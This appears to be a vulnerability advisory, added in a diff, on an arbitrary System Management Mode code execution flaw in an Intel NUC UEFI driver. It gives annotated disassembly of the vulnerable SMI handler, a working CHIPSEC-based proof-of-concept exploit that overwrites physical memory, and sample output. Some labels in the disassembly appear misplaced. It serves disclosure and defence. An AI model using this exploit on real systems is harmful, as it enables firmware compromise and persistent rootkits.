@@ -1,0 +1,250 @@
+
+  Intel NUC arbitrary System Management Mode code execution vulnerability (#2)
+================================================================================
+
+
+  Vulnerable products
+-----------------------
+Intel NUC and other products that uses Intel Integrator Toolkit (aka ITK) UEFI drivers in their firmwares.
+
+  Vulnerability type
+----------------------
+Vulnerable SW SMI handles of Intel Integrator Toolkit UEFI SMM driver allows to overwrite arbitrary memory byte with constant value. This vulnerability type is exploitable and leads to arbitrary System Management Mode code execution.
+
+  Impact
+----------
+Intel NUC6i3SYH is not using SPI Protected Ranges (PRx) flash write protection and BootGuard, so, arbitrary SMM code execution vulnerability allows attacker to infect it's platform firmware with persistent UEFI rootkit.
+
+  Files
+---------
+Vulnerable code is located inside following SMM driver: ItkSmmVars, GUID E9850CDC-EF11-4767-9F71-D01489FAEA9F.
+
+  Discovered by
+-----------------
+Dmytro Oleksiuk - cr4sh0@gmail.com - http://cr4.sh
+
+  
+
+  Vulnerable SW SMI 0xEF handler from ItkSmmVars driver (firmware version: SYSKLi35.86A)
+==========================================================================================
+
+                                       ;
+                                       ; ItkSmmVars driver SW SMI handler 0xEF callback function
+                                       ;
+.text:0000000000002D98 sub_2D98        proc near
+.text:0000000000002D98
+.text:0000000000002D98                 mov     rax, rsp
+.text:0000000000002D9B                 mov     [rax+8], rbx
+.text:0000000000002D9F                 mov     [rax+10h], rbp
+.text:0000000000002DA3                 mov     [rax+20h], rsi
+.text:0000000000002DA7                 push    rdi
+.text:0000000000002DA8                 push    r12
+.text:0000000000002DAA                 push    r13
+.text:0000000000002DAC                 push    r14
+.text:0000000000002DAE                 push    r15
+.text:0000000000002DB0                 sub     rsp, 1D90h
+.text:0000000000002DB7                 xor     edi, edi
+.text:0000000000002DB9                 mov     [rsp+1DB8h+var_1D7C], edi
+.text:0000000000002DBD                 mov     [rsp+1DB8h+var_1D80], edi
+.text:0000000000002DC1                 mov     r13b, dil
+.text:0000000000002DC4                 mov     [rax+18h], dil
+.text:0000000000002DC8                 mov     [rsp+1DB8h+var_1D88], rdi
+.text:0000000000002DCD                 mov     [rsp+1DB8h+var_1D68], rdi
+.text:0000000000002DD2                 cmp     r8, rdi
+.text:0000000000002DD5                 jz      loc_3385
+.text:0000000000002DDB                 cmp     r9, rdi
+.text:0000000000002DDE                 jz      loc_3385
+.text:0000000000002DE4                 mov     r12, [r8]
+.text:0000000000002DE7                 mov     bl, [r8+8]
+.text:0000000000002DEB                 cmp     r12, 0FFFFFFFFFFFFFFFFh
+.text:0000000000002DEF                 jz      loc_3385
+.text:0000000000002DF5                 lea     rax, [rsp+1DB8h+var_1D7C]
+.text:0000000000002DFA                 lea     r14d, [rdi+4]
+.text:0000000000002DFE                 lea     r8d, [rdi+2Ch]           ; Register
+.text:0000000000002E02                 mov     [rsp+1DB8h+Buffer], rax  ; Buffer
+.text:0000000000002E07                 mov     rax, cs:gSmmCpu
+.text:0000000000002E0E                 mov     r9, r12                  ; CpuIndex
+.text:0000000000002E11                 mov     rcx, rax                 ; This
+.text:0000000000002E14                 mov     rdx, r14                 ; Width
+
+                                       ;
+                                       ; Read RSI register value from CPU saved state.
+                                       ;
+.text:0000000000002E17                 call    [rax+EFI_SMM_CPU_PROTOCOL.ReadSaveState]
+.text:0000000000002E19                 mov     rax, cs:gSmmCpu
+.text:0000000000002E20                 lea     r11, [rsp+1DB8h+var_1D80]
+.text:0000000000002E25                 lea     r15d, [rdi+27h]
+.text:0000000000002E29                 mov     rcx, rax                 ; This
+.text:0000000000002E2C                 mov     r9, r12                  ; CpuIndex
+.text:0000000000002E2F                 mov     rdx, r14                 ; Width
+.text:0000000000002E32                 mov     r8d, r15d                ; Register
+.text:0000000000002E35                 mov     [rsp+1DB8h+Buffer], r11  ; Buffer
+
+                                       ;
+                                       ; Read RBX register value from CPU saved state.
+                                       ;
+.text:0000000000002E3A                 call    [rax+EFI_SMM_CPU_PROTOCOL.ReadSaveState]
+.text:0000000000002E3C                 mov     cl, bl
+.text:0000000000002E3E                 mov     rsi, rax
+.text:0000000000002E41                 call    sub_2CD0
+.text:0000000000002E46                 cmp     al, dil
+.text:0000000000002E49                 jnz     loc_3385
+.text:0000000000002E4F                 mov     ebp, [rsp+1DB8h+var_1D7C]
+.text:0000000000002E53                 cmp     bl, 0EFh
+.text:0000000000002E56                 jnz     loc_3359
+.text:0000000000002E5C                 cmp     word ptr [rsp+1DB8h+var_1D80], 13h
+.text:0000000000002E62                 jnz     loc_2F25
+
+                                       ; ... skipped ...
+
+                                       ;
+                                       ; RBP points to SW SMI handler context, this code
+                                       ; checks that sub_2D98() was called as 0xEF SW SMI
+                                       ; handler.
+.text:0000000000002F25 loc_2F25:       ;
+.text:0000000000002F25                 cmp     byte ptr [rbp+0], 0EFh
+.text:0000000000002F29                 mov     r14, 8000000000000002h
+.text:0000000000002F33                 mov     r15, 8000000000000003h
+.text:0000000000002F3D                 cmovnz  rsi, r14
+.text:0000000000002F41                 cmp     rsi, rdi
+.text:0000000000002F44                 jl      short loc_2F7D
+
+                                       ; ... skipped ...
+
+                                       ;
+                                       ; VULNERABLITY IS HERE:
+                                       ;
+                                       ; ESI register value from CPU saved state is loaded
+                                       ; into RBP.
+                                       ;
+                                       ; Byte that located at attacker controllable memory
+                                       ; address can be OR-ed with 1 constant.
+.text:0000000000002F7D loc_2F7D:       ;
+.text:0000000000002F7D                 or      dword ptr [rbp+18h], 1
+.text:0000000000002F81
+.text:0000000000002F81 loc_2F81:
+                                       ;
+                                       ; VULNERABLITY IS HERE:
+                                       ;
+                                       ; Word that located at attacker controllable memory
+                                       ; address can be changed to zero.
+.text:0000000000003350 loc_3350:       ;
+.text:0000000000002F81                 mov     [rbp+0], di
+.text:0000000000002F85                 cmp     rsi, r14
+.text:0000000000002F88                 jz      loc_3350
+
+                                       ; ... skipped ...
+
+                                       ;
+                                       ; VULNERABLITY IS HERE:
+                                       ;
+                                       ; Word that located at attacker controllable memory
+                                       ; address can be OR-ed with 0x8200 constant.
+.text:0000000000003350 loc_3350:       ;
+.text:0000000000003350                 or      dword ptr [rbp+0], 8200h
+.text:0000000000003357                 jmp     short loc_3380
+
+                                       ; ... skipped ...
+
+                                       ;
+                                       ; End of the SW SMI handler code.
+.text:0000000000003380 loc_3380:       ;
+.text:0000000000003380                 mov     rax, rsi
+.text:0000000000003383                 jmp     short loc_3387
+.text:0000000000003385
+.text:0000000000003385 loc_3385:
+.text:0000000000003385                 xor     eax, eax
+.text:0000000000003387
+.text:0000000000003387 loc_3387:
+.text:0000000000003387                 lea     r11, [rsp+1DB8h+var_28]
+.text:000000000000338F                 mov     rbx, [r11+30h]
+.text:0000000000003393                 mov     rbp, [r11+38h]
+.text:0000000000003397                 mov     rsi, [r11+48h]
+.text:000000000000339B                 mov     rsp, r11
+.text:000000000000339E                 pop     r15
+.text:00000000000033A0                 pop     r14
+.text:00000000000033A2                 pop     r13
+.text:00000000000033A4                 pop     r12
+.text:00000000000033A6                 pop     rdi
+.text:00000000000033A7                 retn
+.text:00000000000033A7 sub_2D98        endp
+
+
+
+  Proof of Concept exploit code 
+=================================
+
+#
+# This exploit is OR-ing with 0x8200 one word of memory at 0x1002 address using
+# SW SMI handler vulnerability. To run this code you need to install CHIPSEC.
+#
+import sys, os, time, struct
+
+SMI_NUM = 0xEF
+
+class Chipsec(object):
+
+    def __init__(self):
+
+        import chipsec.chipset
+        import chipsec.hal.physmem
+        import chipsec.hal.interrupts
+
+        # initialize CHIPSEC
+        self.cs = chipsec.chipset.cs()
+        self.cs.init(None, True)
+
+        # get instances of required classes
+        self.mem = chipsec.hal.physmem.Memory(self.cs)
+        self.ints = chipsec.hal.interrupts.Interrupts(self.cs)
+
+    # CHIPSEC has no physical memory read/write methods for quad words
+    def read_physical_mem_qword(self, addr):
+
+        return struct.unpack('Q', self.mem.read_physical_mem(addr, 8))[0]
+
+    def write_physical_mem_qword(self, addr, val):
+
+        self.mem.write_physical_mem(addr, 8, struct.pack('Q', val))
+
+def main():
+
+    # initialize chipsec stuff
+    cs = Chipsec()
+    addr = 0x1000
+
+    overwrite_with_0x8200 = \
+        lambda addr: cs.ints.send_SW_SMI(0, SMI_NUM, 0, 0, 0, 0, 0, addr, 0)
+
+    # fill memory with zero values
+    cs.mem.write_physical_mem(addr, 0x100, '\0' * 0x100)
+
+    print 'Overwriting memory at 0x%x with 0x8200...' % addr
+
+    # overwrite memory at target address with \x00\x82
+    overwrite_with_0x8200(addr)
+
+    # read and test overwritten value
+    val = cs.mem.read_physical_mem_word(addr)
+
+    print 'SUCCESS' if val == 0x8200 else \
+          'FAILS'
+
+    return 0
+
+if __name__ == '__main__':
+
+    exit(main())
+
+
+
+  Example of exploit output on vulnerable system
+==================================================
+
+# python smi_expl_EF_nuc.py
+****** Chipsec Linux Kernel module is licensed under GPL 2.0
+Overwriting memory at 0x1000 with 0x8200...
+Generating SW SMI 0xef...
+SUCCESS
+
+
